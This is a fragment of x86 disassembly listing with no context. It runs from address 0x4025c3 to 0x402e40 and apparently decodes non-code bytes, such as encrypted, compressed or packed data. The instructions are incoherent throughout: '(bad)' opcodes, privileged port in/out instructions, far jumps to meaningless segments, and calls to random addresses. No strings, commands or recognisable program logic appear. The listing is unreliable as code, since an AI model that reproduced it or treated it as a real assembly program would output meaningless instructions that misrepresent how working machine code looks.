  4025c3:	loop   0x40259e
  4025c5:	mov    ah,0xd0
  4025c7:	retf   0xecdf
  4025ca:	shl    ch,1
  4025cc:	call   0xf546f7c0
  4025d1:	(bad)  
  4025d2:	(bad)  
  4025d4:	(bad)  
  4025d5:	clc    
  4025d6:	shl    dl,0xc6
  4025d9:	or     eax,0xc9ca04fb
  4025de:	out    dx,eax
  4025df:	(bad)  
  4025e0:	in     eax,dx
  4025e1:	mov    dh,0xee
  4025e3:	in     al,0xf0
  4025e5:	mov    edx,0xd6b4b1d3
  4025ea:	(bad)  
  4025eb:	(bad)  
  4025ed:	mov    ebp,0xe4eccef9
  4025f2:	in     al,dx
  4025f3:	repnz jecxz 0x402600
  4025f6:	mul    ebx
  4025f8:	push   es
  4025f9:	out    dx,eax
  4025fa:	in     eax,dx
  4025fb:	ror    ebx,cl
  4025fd:	fdiv   st,st(3)
  4025ff:	in     eax,dx
  402600:	int3   
  402601:	fadd   st(3),st
  402603:	hlt    
  402604:	ret    0xccef
  402607:	mov    ebx,0xe8cffaeb
  40260c:	aam    0xcc
  40260e:	call   0xe320fa19
  402613:	loope  0x40261b
  402615:	ret    0x906
  402618:	or     ecx,DWORD PTR [ecx]
  40261a:	add    ebp,ebx
  40261c:	int3   
  40261d:	shl    BYTE PTR [ebx-0x1b135315],cl
  402623:	mov    ebx,0xc4b9bbf5
  402628:	cmc    
  402629:	test   esi,0xfedcbebe
  40262f:	fdivr  QWORD PTR [esi-0x31e0c33]
  402635:	stc    
  402636:	jmp    0x60d33ff
  40263b:	add    eax,DWORD PTR [ebx]
  40263d:	int3   
  40263e:	jmp    0x402636
  402640:	(bad)  
  402642:	mov    esp,0xebc1cecb
  402647:	not    ch
  402649:	mov    bh,0xc8
  40264b:	into   
  40264c:	fcmovne st,st(4)
  40264e:	sti    
  40264f:	int    0xf4
  402651:	add    esp,ebp
  402653:	sar    esp,cl
  402655:	shl    ah,1
  402657:	(bad)  
  402659:	cld    
  40265a:	jmp    0xf7c3:0xaeb20ae3
  402661:	repz fcmovne st,st(7)
  402664:	shl    BYTE PTR [esi-0x4a07190c],cl
  40266a:	(bad)  
  40266b:	in     eax,dx
  40266c:	cld    
  40266d:	shl    ecx,1
  40266f:	icebp  
  402670:	ret    
  402671:	add    esi,eax
  402673:	repnz retf 0xc0fe
  402677:	ror    DWORD PTR [ecx],0xed
  40267a:	or     eax,ecx
  40267c:	jmp    0x40265d
  40267e:	lods   al,BYTE PTR ds:[esi]
  40267f:	rol    eax,0xac
  402682:	lods   eax,DWORD PTR ds:[esi]
  402683:	aad    0xc7
  402685:	aam    0xdb
  402687:	jmp    0xf943fc47
  40268c:	cli    
  40268d:	sti    
  40268e:	lock add dh,dh
  402691:	in     al,0xe7
  402693:	mov    ecx,0x7d0f4f8
  402698:	retf   0xe50c
  40269b:	in     eax,dx
  40269c:	fadd   st,st(7)
  40269e:	ret    0xf5ef
  4026a1:	fmul   st(6),st
  4026a3:	aam    0xb7
  4026a5:	clc    
  4026a6:	fistp  QWORD PTR [ebx-0xd223110]
  4026ac:	cmc    
  4026ad:	aad    0xfb
  4026af:	push   es
  4026b0:	loop   0x40266f
  4026b2:	ret    
  4026b3:	add    al,0x6
  4026b5:	(bad)  
  4026b6:	out    0xe1,eax
  4026b8:	stc    
  4026b9:	in     al,dx
  4026ba:	fadd   DWORD PTR [ecx+esi*8]
  4026bd:	mov    ecx,0xb1e0c5a8
  4026c2:	aam    0xc7
  4026c4:	retf   0xf8e5
  4026c7:	(bad)  
  4026c8:	(bad)  
  4026c9:	(bad)  
  4026cb:	mov    ecx,0xdaf7ccf9
  4026d0:	aad    0xf1
  4026d2:	push   es
  4026d3:	sar    al,1
  4026d5:	fstp   st(2)
  4026d7:	std    
  4026d8:	(bad)  
  4026da:	out    dx,al
  4026db:	stc    
  4026dc:	adc    ecx,esp
  4026de:	mov    bl,0xdf
  4026e0:	retf   
  4026e1:	shl    DWORD PTR [esi-0x3f144d33],cl
  4026e7:	mov    edx,0xfbe8c9f0
  4026ec:	in     eax,dx
  4026ed:	clc    
  4026ee:	clc    
  4026ef:	repz sti 
  4026f1:	icebp  
  4026f2:	(bad)  
  4026f3:	inc    DWORD PTR [edx]
  4026f5:	cli    
  4026f6:	out    0xea,eax
  4026f8:	jecxz  0x4026be
  4026fa:	int3   
  4026fb:	fmul   DWORD PTR [ebx+ebp*4]
  4026fe:	stos   BYTE PTR es:[edi],al
  4026ff:	test   al,0xc9
  402701:	shl    BYTE PTR [ecx-0x462e2d2a],cl
  402707:	jmp    0xbacc:0xdde9dfd2
  40270e:	rol    edx,1
  402710:	ret    
  402711:	cmc    
  402712:	vpavgw ymm2,ymm0,ymm6
  402716:	jmp    0xcd05:0xcc03c0cf
  40271d:	repnz fucom st(4)
  402720:	mov    ebp,0xe8e0b6c4
  402725:	mov    ah,0xff
  402727:	in     eax,0xc8
  402729:	jmp    0x4026e3
  40272b:	(bad)  
  40272c:	mov    edi,0x5bce8c8
  402731:	(bad)  
  402732:	test   DWORD PTR [eax],0xe8c7dbfb
  402738:	cmc    
  402739:	out    dx,al
  40273a:	(bad)  [eax]
  40273c:	iret   
  40273d:	mov    dl,0xe4
  40273f:	out    0xdc,al
  402741:	xlat   BYTE PTR ds:[ebx]
  402742:	rcl    ecx,cl
  402744:	(bad)  
  402745:	(bad)
  402748:	sar    DWORD PTR [edx-0x3c05272e],cl
  40274e:	cli    
  40274f:	out    0xd8,al
  402751:	mov    ebp,0xf0eac3f7
  402756:	ret    0xfd02
  402759:	(bad)  
  40275a:	leave  
  40275b:	loop   0x40274b
  40275d:	out    0xe1,eax
  40275f:	shr    dl,1
  402761:	shl    edi,cl
  402763:	in     eax,dx
  402764:	mov    bl,0xb9
  402766:	enter  0xbbb9,0xfd
  40276a:	fcmovbe st,st(4)
  40276c:	repnz (bad) 
  40276e:	repnz jecxz 0x402732
  402771:	loop   0x40274a
  402773:	cli    
  402774:	(bad)  
  402775:	out    0x6,eax
  402777:	(bad)  
  402778:	(bad)  
  40277a:	add    BYTE PTR [edi],al
  40277c:	loopne 0x402770
  40277e:	int3   
  40277f:	loop   0x402741
  402781:	retf   
  402782:	jmp    0xc605f055
  402787:	aam    0xec
  402789:	idiv   dh
  40278b:	fcmovu st,st(6)
  40278d:	clc    
  40278e:	loopne 0x402753
  402790:	add    eax,0xc4f6badc
  402795:	ret    0xe9fd
  402798:	enter  0xed02,0xd3
  40279c:	or     eax,0xf0cdd0ac
  4027a1:	mov    bl,0xae
  4027a3:	(bad)
  4027a6:	div    DWORD PTR [eax-0x20343b08]
  4027ac:	f2xm1  
  4027ae:	call   0xf738086b
  4027b3:	mov    ebp,0xde01f505
  4027b8:	add    eax,0x6eff9ef
  4027bd:	mov    esi,0xd4acd3cd
  4027c2:	lods   eax,DWORD PTR ds:[esi]
  4027c3:	in     al,0xa8
  4027c5:	fcomp  st(1)
  4027c7:	aam    0xde
  4027c9:	out    dx,al
  4027ca:	cmc    
  4027cb:	fsub   st(4),st
  4027cd:	int    0xfd
  4027cf:	lock repnz add al,0xf5
  4027d3:	(bad)  
  4027d5:	or     BYTE PTR [esi],al
  4027d7:	shl    al,0xfe
  4027da:	cli    
  4027db:	dec    ch
  4027dd:	shr    ah,cl
  4027df:	ffreep st(6)
  4027e1:	(bad)
  4027e5:	out    0xe0,eax
  4027e7:	(bad)  
  4027e8:	in     al,0xff
  4027ea:	mov    eax,0xf4dbc8c3
  4027ef:	dec    esi
  4027f1:	in     eax,dx
  4027f2:	in     eax,0xd8
  4027f4:	out    0xe4,al
  4027f6:	(bad)  
  4027f7:	fdiv   st(1),st
  4027f9:	out    0xff,eax
  4027fb:	or     ch,bl
  4027fd:	into   
  4027fe:	jmp    0xccf315e6
  402803:	(bad)  
  402804:	shr    esp,cl
  402806:	mov    eax,0xdfc8f4f8
  40280b:	mov    ebp,0xe1ceedec
  402810:	hlt    
  402811:	(bad)  
  402813:	repz add ebx,ebx
  402816:	in     al,0x5
  402818:	(bad)  
  402819:	call   0xae00341a
  40281e:	faddp  st(2),st
  402820:	ret    
  402821:	(bad)  
  402822:	call   0xd3efe8f2
  402827:	out    dx,al
  402828:	mov    eax,0xf0d9bafc
  40282d:	fistp  QWORD PTR [edi-0x2913fd29]
  402833:	out    0xcb,eax
  402835:	in     al,0xdf
  402837:	push   cs
  402838:	cmc    
  402839:	loopne 0x40283f
  40283b:	add    edx,DWORD PTR [ebx]
  40283d:	fmul   st(5),st
  40283f:	mov    bh,0xd6
  402841:	(bad)  
  402842:	in     al,0xe3
  402844:	jmp    0x40280e
  402846:	into   
  402847:	call   0xdd0f2119
  40284c:	jecxz  0x40280a
  40284e:	ret    0xe0be
  402851:	vpavgb xmm6,xmm4,xmm5
  402855:	out    0xf9,al
  402857:	neg    al
  402859:	or     BYTE PTR [edx],cl
  40285b:	sar    eax,0xf1
  40285e:	mov    eax,0xb4b1c4df
  402863:	call   0xc70e2455
  402868:	(bad)  
  402869:	hlt    
  40286a:	in     al,0xd1
  40286c:	leave  
  40286d:	cli    
  40286e:	xlat   BYTE PTR ds:[ebx]
  40286f:	cli    
  402870:	in     eax,0xe5
  402872:	stc    
  402873:	fdiv   st(1),st
  402875:	cli    
  402876:	call   0xa3d3066
  40287b:	fdiv   st(7),st
  40287d:	shl    edi,1
  40287f:	test   al,0xa4
  402881:	jmp    0x40285e
  402883:	loope  0x402855
  402885:	xlat   BYTE PTR ds:[ebx]
  402886:	sar    al,1
  402888:	mov    ch,0xba
  40288a:	(bad)  
  40288b:	iret   
  40288c:	loope  0x40284b
  40288e:	rcr    al,cl
  402890:	pop    es
  402891:	ret    
  402892:	rcr    dh,cl
  402894:	add    eax,0xc70201fd
  402899:	fucom  st(3)
  40289b:	repnz leave 
  40289d:	shr    ebp,1
  40289f:	scas   al,BYTE PTR es:[edi]
  4028a0:	loop   0x40288d
  4028a2:	shl    ah,0xe6
  4028a5:	mov    edx,0xbbcdf8cf
  4028aa:	aad    0xf3
  4028ac:	(bad)  
  4028ad:	(bad)  
  4028ae:	cmc    
  4028af:	rcr    bh,cl
  4028b1:	add    edi,esi
  4028b3:	ror    BYTE PTR [ecx],1
  4028b5:	rol    BYTE PTR [ebx],1
  4028b7:	shl    ecx,0x4
  4028ba:	jmp    0xab183bcd
  4028bf:	sar    BYTE PTR [ebp-0x1f341f38],0xb5
  4028c6:	hlt    
  4028c7:	mov    dh,0xeb
  4028c9:	(bad)  
  4028ca:	lock fsub st,st(2)
  4028cd:	(bad)  
  4028ce:	std    
  4028cf:	mov    eax,0xc0bdbffc
  4028d4:	fcmovnb st,st(7)
  4028d6:	(bad)  
  4028d8:	cli    
  4028d9:	add    eax,0xe9c407da
  4028de:	leave  
  4028df:	fsub   st(1),st
  4028e1:	leave  
  4028e2:	xlat   BYTE PTR ds:[ebx]
  4028e3:	mov    al,0xf4
  4028e5:	out    dx,al
  4028e6:	jmp    0xb0d8:0xb6d6cbe6
  4028ed:	int    0xfe
  4028ef:	add    BYTE PTR [ebx+edi*4+0x1c6dbfd],dh
  4028f6:	stc    
  4028f7:	retf   0xc5d5
  4028fa:	in     eax,0xea
  4028fc:	out    0xe7,al
  4028fe:	xlat   BYTE PTR ds:[ebx]
  4028ff:	shl    edx,cl
  402901:	test   cl,0xd6
  402904:	(bad)  
  402905:	loopne 0x4028fc
  402907:	enter  0xfbde,0xeb
  40290b:	jmp    0xdd3917ec
  402910:	rcr    ebp,cl
  402912:	fadd   st,st(4)
  402914:	stc    
  402915:	leave  
  402916:	out    dx,eax
  402917:	leave  
  402918:	aam    0xc9
  40291a:	(bad)  
  40291b:	retf   
  40291c:	push   es
  40291d:	into   
  40291e:	ret    0xcfaf
  402921:	in     al,dx
  402922:	ret    
  402923:	lods   eax,DWORD PTR ds:[esi]
  402924:	imul   ebx
  402926:	in     eax,0xb4
  402928:	fucomi st,st(3)
  40292a:	fcmovnu st,st(7)
  40292c:	(bad)  
  40292d:	mov    ecx,0xf0c202b8
  402932:	aad    0xcb
  402934:	fsubr  st(1),st
  402936:	ror    cl,1
  402938:	(bad)  
  40293a:	or     eax,0xdfb2d3e5
  40293f:	lods   al,BYTE PTR ds:[esi]
  402940:	loope  0x4028f8
  402942:	(bad)  
  402943:	loopne 0x402909
  402945:	shl    DWORD PTR [edx-0x10491b12],1
  40294b:	in     al,dx
  40294c:	mov    esi,0xf9e6f7f0
  402951:	vshufpd xmm1,xmm1,XMMWORD PTR [ebx],0xd4
  402956:	sti    
  402957:	stc    
  402958:	neg    ch
  40295a:	or     eax,0xb3ae04fb
  40295f:	repz shr eax,cl
  402962:	les    edi,FWORD PTR [ebx-0xa0f054b]
  402968:	cli    
  402969:	mov    bl,0xd3
  40296b:	test   BYTE PTR [ecx],0xd6
  40296e:	xlat   BYTE PTR ds:[ebx]
  40296f:	rcl    edx,0xd5
  402972:	(bad)  
  402974:	loopne 0x402935
  402976:	ror    cl,1
  402978:	or     eax,0xf9cee0c5
  40297d:	in     al,dx
  40297e:	out    0xc5,eax
  402980:	ret    0xcfc4
  402983:	into   
  402984:	jmp    0xd412023e
  402989:	out    dx,al
  40298a:	clc    
  40298b:	(bad)  
  40298d:	mov    ebp,0xdef4cfbe
  402992:	in     al,0xd7
  402994:	ret    0x6e2
  402997:	out    dx,eax
  402998:	cli    
  402999:	clc    
  40299a:	or     cl,BYTE PTR [ebx]
  40299c:	retf   
  40299d:	in     eax,dx
  40299e:	lock out dx,al
  4029a0:	xlat   BYTE PTR ds:[ebx]
  4029a1:	mov    dl,0xe5
  4029a3:	shl    edi,cl
  4029a5:	sar    ebx,1
  4029a7:	(bad)
  4029aa:	mov    ecx,0xfbfbb802
  4029af:	hlt    
  4029b0:	xlat   BYTE PTR ds:[ebx]
  4029b1:	mov    ebp,0xfce7e0c4
  4029b6:	(bad)  
  4029b7:	iret   
  4029b8:	add    al,0xed
  4029ba:	enter  0xff08,0xdc
  4029be:	in     al,dx
  4029bf:	retf   0xeac0
  4029c2:	iret   
  4029c3:	rol    esi,cl
  4029c5:	sti    
  4029c6:	idiv   dh
  4029c8:	neg    ebx
  4029ca:	(bad)  
  4029cc:	cld    
  4029cd:	add    bl,dl
  4029cf:	loope  0x40298e
  4029d1:	(bad)  
  4029d2:	stc    
  4029d3:	in     eax,0xf9
  4029d5:	lock or DWORD PTR [eax],eax
  4029d8:	hlt    
  4029d9:	push   esp
  4029db:	out    dx,al
  4029dc:	add    al,0xee
  4029de:	stos   BYTE PTR es:[edi],al
  4029df:	rcl    edx,0xe2
  4029e2:	icebp  
  4029e3:	(bad)
  4029e6:	mov    edx,0xd8f0d9bf
  4029eb:	(bad)  
  4029ed:	mov    ebp,0xe5e7efd4
  4029f2:	jmp    0x4029c6
  4029f4:	loop   0x4029f7
  4029f6:	(bad)  
  4029f8:	std    
  4029f9:	jmp    0x4029f5
  4029fb:	repnz push es
  4029fd:	test   al,0xf0
  4029ff:	mov    dl,0xa4
  402a01:	shl    cl,0xe9
  402a04:	mov    ebx,0xf5f3ebda
  402a09:	sar    edi,cl
  402a0b:	fdivrp st(4),st
  402a0d:	fld    DWORD PTR [eax]
  402a0f:	cli    
  402a10:	mov    esi,0xfdd2bed4
  402a15:	loopne 0x4029fa
  402a17:	fdivp  st(7),st
  402a19:	add    al,0xdf
  402a1b:	std    
  402a1c:	adc    DWORD PTR [ebp-0x3143403e],edi
  402a22:	ret    
  402a23:	lock leave 
  402a25:	(bad)  
  402a26:	retf   0xeac6
  402a29:	aad    0xc9
  402a2b:	sti    
  402a2c:	xlat   BYTE PTR ds:[ebx]
  402a2d:	add    DWORD PTR [esi-0x26404225],esi
  402a33:	in     eax,0xeb
  402a35:	or     al,al
  402a37:	in     eax,0xd5
  402a39:	loope  0x402a03
  402a3b:	add    ebx,ecx
  402a3d:	jecxz  0x402a30
  402a3f:	mov    bl,0xae
  402a41:	mul    bl
  402a43:	(bad)  
  402a44:	fnstcw WORD PTR [ebx-0x33122b15]
  402a4a:	cli    
  402a4b:	mov    ebx,0xb8ddb7e2
  402a50:	repnz aad 0xf3
  402a53:	aam    0xf2
  402a55:	fadd   QWORD PTR ds:0xecca0d0e
  402a5b:	retf   0xb304
  402a5e:	ror    esp,0xc8
  402a61:	int    0xcd
  402a63:	jecxz  0x402a51
  402a65:	shl    dh,1
  402a67:	mov    dh,0xb7
  402a69:	out    dx,eax
  402a6a:	(bad)  
  402a6b:	cli    
  402a6c:	cmc    
  402a6d:	mov    eax,0x6ede2d7
  402a72:	(bad)  
  402a73:	fiadd  DWORD PTR [edi]
  402a75:	lock (bad) 
  402a78:	loop   0x402a7d
  402a7a:	call   0xc029106c
  402a7f:	icebp  
  402a80:	out    dx,al
  402a81:	mov    ch,0xcb
  402a83:	int    0xb3
  402a85:	repnz (bad) 
  402a87:	clc    
  402a88:	mov    esi,0xd9fef3e4
  402a8d:	loope  0x402a61
  402a8f:	inc    bh
  402a91:	fnclex 
  402a93:	mov    esp,0xdfdb00e5
  402a98:	rol    dh,0xea
  402a9b:	fmul   QWORD PTR [edx]
  402a9d:	mov    edi,0xc0b7c2d2
  402aa2:	fucomi st,st(4)
  402aa4:	mov    ch,0xeb
  402aa6:	jmp    0xdccc:0x3ead9d4
  402aad:	in     al,dx
  402aae:	loope  0x402a9e
  402ab0:	add    eax,0xdacbbcd0
  402ab5:	std    
  402ab6:	jmp    0xc526f2a9
  402abb:	cli    
  402abc:	adc    ch,BYTE PTR [edx+ebp*4-0xd391a10]
  402ac3:	aam    0xfa
  402ac5:	retf   
  402ac6:	iret   
  402ac7:	xlat   BYTE PTR ds:[ebx]
  402ac8:	rcr    esi,cl
  402aca:	mov    dl,0xbe
  402acc:	std    
  402acd:	(bad)  
  402acf:	xbegin 0x3152ac9
  402ad5:	loope  0x402ad3
  402ad7:	pop    es
  402ad8:	add    DWORD PTR ds:0xccd3fde9,ecx
  402ade:	(bad)
  402ae1:	retf   
  402ae2:	mov    cl,0xf2
  402ae4:	shl    esp,cl
  402ae6:	(bad)  
  402ae8:	(bad)  
  402ae9:	cld    
  402aea:	into   
  402aeb:	fidiv  WORD PTR [eax-0x1f112246]
  402af1:	add    al,0xf1
  402af3:	fcomip st,st(1)
  402af5:	or     bl,ch
  402af7:	cld    
  402af8:	add    bl,bl
  402afa:	add    al,0x12
  402afc:	add    ecx,esi
  402afe:	retf   
  402aff:	mov    esp,0xebebd5c1
  402b04:	in     eax,dx
  402b05:	ror    ah,1
  402b07:	fcmovne st,st(6)
  402b09:	mov    edi,0xd1dab1f0
  402b0e:	mov    esi,0xfbc303c0
  402b13:	jecxz  0x402acd
  402b15:	or     al,dh
  402b17:	push   cs
  402b18:	add    eax,0xd907dd
  402b1d:	in     eax,dx
  402b1e:	scas   al,BYTE PTR es:[edi]
  402b1f:	(bad)  
  402b20:	loop   0x402ae7
  402b22:	jecxz  0x402b0e
  402b24:	mov    dl,0xe6
  402b26:	(bad)  
  402b28:	mov    ch,0xd4
  402b2a:	mov    ah,0xf7
  402b2c:	add    ecx,ecx
  402b2e:	(bad)  
  402b30:	rcl    edi,1
  402b32:	std    
  402b33:	or     esi,esi
  402b35:	aam    0xdc
  402b37:	enter  0xe1f9,0xdb
  402b3b:	jmp    0x402b49
  402b3d:	(bad)  
  402b3e:	jmp    0x402b0b
  402b40:	div    BYTE PTR [edx-0x719350b]
  402b46:	jmp    0xee02:0xccb5cde5
  402b4d:	(bad)  
  402b4e:	mov    edi,0xc2dcdee3
  402b53:	(bad)  
  402b55:	call   0xf0352164
  402b5a:	or     cl,ah
  402b5c:	in     eax,dx
  402b5d:	(bad)  
  402b5e:	icebp  
  402b5f:	out    dx,eax
  402b60:	mov    al,0xcc
  402b62:	mov    bl,0xed
  402b64:	jmp    0xbad5:0xebcaaeb3
  402b6b:	fcomp  st(1)
  402b6d:	(bad)  
  402b6e:	mov    eax,0xc2f9dd02
  402b73:	xlat   BYTE PTR ds:[ebx]
  402b74:	loop   0x402b4c
  402b76:	add    eax,0xc2f4c9c4
  402b7b:	loop   0x402b8c
  402b7d:	repnz out dx,eax
  402b7f:	mov    ebp,0xc8fbb6c4
  402b84:	jmp    0xfcf9:0xb6eef1e1
  402b8b:	leave  
  402b8c:	mov    esi,0xe1d4fcb9
  402b91:	pop    es
  402b92:	lds    ecx,FWORD PTR [ebx]
  402b94:	ror    DWORD PTR [ecx],1
  402b96:	rol    BYTE PTR [esi],0xeb
  402b99:	ret    
  402b9a:	or     ah,bl
  402b9c:	(bad)  
  402b9e:	mov    edi,0xadd4bcc2
  402ba3:	cli    
  402ba4:	rcl    ebp,0xba
  402ba7:	(bad)  
  402ba8:	(bad)  
  402ba9:	hlt    
  402baa:	mov    ah,0xf2
  402bac:	mov    ebp,0xd4e102
  402bb1:	sti    
  402bb2:	std    
  402bb3:	repnz cli 
  402bb5:	add    ebp,edx
  402bb7:	(bad)  
  402bb8:	fsubp  st(6),st
  402bba:	enter  0x5e0,0xc8
  402bbe:	ret    0xa8ed
  402bc1:	out    dx,al
  402bc2:	mov    bl,0xa9
  402bc4:	rol    dh,cl
  402bc6:	lock mov edx,0xd0eed4e9
  402bcc:	mov    ecx,0xd4f307ed
  402bd1:	aam    0xbc
  402bd3:	out    0x5,al
  402bd5:	(bad)
  402bd8:	jmp    0xaed3:0xcbdbe7fe
  402bdf:	int3   
  402be0:	mov    dl,0xf6
  402be2:	out    0xf7,eax
  402be4:	into   
  402be5:	jmp    0xdeb6:0xccf3e6c8
  402bec:	cld    
  402bed:	mov    edx,0xbc03f0b6
  402bf2:	jmp    0x402bdf
  402bf4:	cmc    
  402bf5:	mov    edi,0xdffcdafd
  402bfa:	out    dx,al
  402bfb:	or     eax,0xf3c0cbfe
  402c00:	into   
  402c01:	loope  0x402bef
  402c03:	cmc    
  402c04:	int    0xf7
  402c06:	out    0xd1,al
  402c08:	out    dx,eax
  402c09:	mov    edx,0xddece8ef
  402c0e:	cld    
  402c0f:	std    
  402c10:	hlt    
  402c11:	xlat   BYTE PTR ds:[ebx]
  402c12:	fcomi  st,st(3)
  402c14:	loopne 0x402bf9
  402c16:	dec    BYTE PTR [esi]
  402c18:	(bad)  
  402c19:	call   0xbc53f5fe
  402c1e:	enter  0xe4e8,0xcf
  402c22:	int3   
  402c23:	(bad)
  402c26:	stc    
  402c27:	into   
  402c28:	fistp  QWORD PTR [edi-0x12092a4e]
  402c2e:	int    0xd3
  402c30:	cmc    
  402c31:	add    cl,ah
  402c33:	retf   
  402c34:	hlt    
  402c35:	(bad)  
  402c36:	add    eax,0xc80abd
  402c3b:	out    dx,eax
  402c3c:	out    0xde,al
  402c3e:	mov    esi,0xbcb2eca5
  402c43:	loopne 0x402c40
  402c45:	mov    ecx,0xb8d3dfed
  402c4a:	mov    ecx,0x1e9bed3
  402c4f:	mov    edi,0xf1c5ddd8
  402c54:	xlat   BYTE PTR ds:[ebx]
  402c55:	mov    edi,0xdc08e6d4
  402c5a:	jmp    0xc4303f4c
  402c5f:	out    dx,al
  402c60:	in     eax,dx
  402c61:	out    dx,eax
  402c62:	enter  0xc9f3,0xe8
  402c66:	in     eax,0xef
  402c68:	mov    esi,0xcfb5f0e4
  402c6d:	fdivr  st(0),st
  402c6f:	clc    
  402c70:	(bad)  
  402c72:	hlt    
  402c73:	stc    
  402c74:	aam    0xfc
  402c76:	sti    
  402c77:	test   DWORD PTR [ebx],0xcffee0cb
  402c7d:	loope  0x402c6b
  402c7f:	mov    ebp,0xade9e6b3
  402c84:	stc    
  402c85:	mov    dl,0xfb
  402c87:	fdivp  st(3),st
  402c89:	lock mov ebx,0xee00fede
  402c8f:	shl    edi,cl
  402c91:	(bad)  
  402c92:	clc    
  402c93:	out    0xfb,al
  402c95:	add    al,0xe9
  402c97:	not    dh
  402c99:	jecxz  0x402c9c
  402c9b:	retf   0xc107
  402c9e:	out    0xf0,eax
  402ca0:	(bad)  
  402ca1:	out    0xd7,al
  402ca3:	jecxz  0x402c92
  402ca5:	jmp    0xcffb0762
  402caa:	lock retf 
  402cac:	sti    
  402cad:	sti    
  402cae:	fsubr  st,st(5)
  402cb0:	in     al,dx
  402cb1:	fcomi  st,st(3)
  402cb3:	clc    
  402cb4:	mov    esp,0xdcd9f5c1
  402cb9:	add    eax,0xe212eee3
  402cbe:	shl    dh,cl
  402cc0:	test   al,0xe2
  402cc2:	iret   
  402cc3:	call   0xd8381d70
  402cc8:	bnd jmp 0x402caa
  402ccb:	rcr    ecx,cl
  402ccd:	mov    edx,0xe5ecdac2
  402cd2:	xlat   BYTE PTR ds:[ebx]
  402cd3:	loopne 0x402cce
  402cd5:	jecxz  0x402ca2
  402cd7:	or     BYTE PTR [eax],cl
  402cd9:	std    
  402cda:	enter  0xcafb,0xb2
  402cde:	in     eax,0xb2
  402ce0:	out    0xe3,eax
  402ce2:	jmp    0x402cb4
  402ce4:	shl    BYTE PTR [ebp-0x4c0e3010],1
  402cea:	mov    esp,0xd3d9cfdd
  402cef:	cmc    
  402cf0:	add    al,BYTE PTR [edi+eax*8]
  402cf3:	retf   
  402cf4:	lock neg dl
  402cf7:	add    esi,esp
  402cf9:	add    eax,0xbce7e503
  402cfe:	test   al,0xde
  402d00:	enter  0xadca,0xf1
  402d04:	cmc    
  402d05:	aam    0xf9
  402d07:	into   
  402d08:	stc    
  402d09:	mov    esi,0xbcd103b8
  402d0e:	int    0xc7
  402d10:	jmp    eax
  402d12:	aam    0xcb
  402d14:	(bad)  
  402d15:	cli    
  402d16:	cmc    
  402d17:	push   es
  402d18:	(bad)  
  402d19:	sti    
  402d1a:	(bad)  
  402d1b:	int3   
  402d1c:	or     DWORD PTR [edi-0x2e291e32],ebp
  402d22:	mov    al,0xa9
  402d24:	loopne 0x402d10
  402d26:	rcl    ebx,cl
  402d28:	fcom   st(2)
  402d2a:	test   dl,0xce
  402d2d:	jmp    0xe106fa23
  402d32:	loop   0x402d38
  402d34:	jmp    0x402cf7
  402d36:	add    dl,dh
  402d38:	in     eax,0xe9
  402d3a:	enter  0xcf0a,0xed
  402d3e:	jmp    0xeef0d204
  402d43:	(bad)  
  402d44:	repnz sar al,cl
  402d47:	enter  0xffb6,0xcd
  402d4b:	into   
  402d4c:	retf   0xde01
  402d4f:	xlat   BYTE PTR ds:[ebx]
  402d50:	push   es
  402d51:	jecxz  0x402d0f
  402d53:	loopne 0x402d4b
  402d55:	add    al,0xfb
  402d57:	jmp    0x402d33
  402d59:	clc    
  402d5a:	fdivr  st,st(0)
  402d5c:	out    0xad,eax
  402d5e:	mov    edi,0xd6e3b3a8
  402d63:	repnz (bad) 
  402d65:	in     al,dx
  402d66:	jmp    0x402d5b
  402d68:	(bad)
  402d6b:	stc    
  402d6c:	fdivr  QWORD PTR [edi-0x5280947]
  402d72:	loope  0x402d75
  402d74:	(bad)  
  402d75:	std    
  402d76:	add    ecx,DWORD PTR [esi]
  402d78:	leave  
  402d79:	iret   
  402d7a:	(bad)
  402d7d:	jecxz  0x402d4f
  402d7f:	fsubp  st(4),st
  402d81:	not    bh
  402d83:	fucomi st,st(7)
  402d85:	mov    ah,0xfb
  402d87:	cli    
  402d88:	int3   
  402d89:	mov    ah,0xbf
  402d8b:	mov    esp,0xf8baffc2
  402d90:	in     eax,dx
  402d91:	(bad)  
  402d92:	aam    0xe2
  402d94:	(bad)  
  402d96:	jmp    0x4d0ca6
  402d9b:	or     edi,esp
  402d9d:	(bad)  
  402d9e:	rcl    bh,1
  402da0:	mov    ebp,0xc7efcabd
  402da5:	out    0xfa,eax
  402da7:	aam    0xc9
  402da9:	fcomip st,st(5)
  402dab:	clc    
  402dac:	(bad)  
  402dad:	fcmovu st,st(7)
  402daf:	repnz in eax,0xdb
  402db2:	fdivr  st(6),st
  402db4:	rol    DWORD PTR [edi],0xfc
  402db7:	fmul   st,st(2)
  402db9:	(bad)  
  402dbb:	(bad)  
  402dbc:	(bad)  [edx-0x1e3b221f]
  402dc2:	ror    edx,cl
  402dc4:	hlt    
  402dc5:	(bad)  
  402dc6:	jmp    0x402d94
  402dc8:	(bad)  
  402dca:	int3   
  402dcb:	loop   0x402dc4
  402dcd:	(bad)  
  402dce:	fsubp  st(6),st
  402dd0:	push   edi
  402dd2:	jmp    ebx
  402dd4:	or     DWORD PTR [ecx],ecx
  402dd6:	fsub   st,st(6)
  402dd8:	add    ecx,edi
  402dda:	fldpi  
  402ddc:	adc    al,ch
  402dde:	mov    eax,0xd0edc9e5
  402de3:	repz fcmovb st,st(6)
  402de6:	mov    ch,0xec
  402de8:	(bad)  
  402dea:	xlat   BYTE PTR ds:[ebx]
  402deb:	in     eax,dx
  402dec:	(bad)  
  402dee:	in     eax,dx
  402def:	loope  0x402de3
  402df1:	mov    esp,0xe9daf6e5
  402df6:	retf   
  402df7:	psadbw mm5,mm4
  402dfa:	call   0xcdfcfd12
  402dff:	mov    bh,0xec
  402e01:	mov    ebp,0xf7dad2c9
  402e06:	call   0xd03a1ad3
  402e0b:	mov    ebp,0x2f9f5ed
  402e10:	fucom  st(6)
  402e12:	or     ecx,ebx
  402e14:	ret    
  402e15:	(bad)  
  402e17:	out    dx,al
  402e18:	in     eax,dx
  402e19:	in     al,dx
  402e1a:	iret   
  402e1b:	ftst   
  402e1d:	(bad)  
  402e1e:	jecxz  0x402e17
  402e20:	retf   0xe6b3
  402e23:	(bad)  
  402e24:	repnz mov cl,0xe0
  402e27:	mov    cl,0xec
  402e29:	repz (bad) 
  402e2b:	icebp  
  402e2c:	aad    0xcc
  402e2e:	int    0xd6
  402e30:	mov    eax,0xf4cbe7f9
  402e35:	sar    ebx,0xf7
  402e38:	jmp    0xc527f844
  402e3d:	scas   al,BYTE PTR es:[edi]
  402e3e:	iret   
  402e3f:	lods   al,BYTE PTR ds:[esi]
  402e40:	(bad)
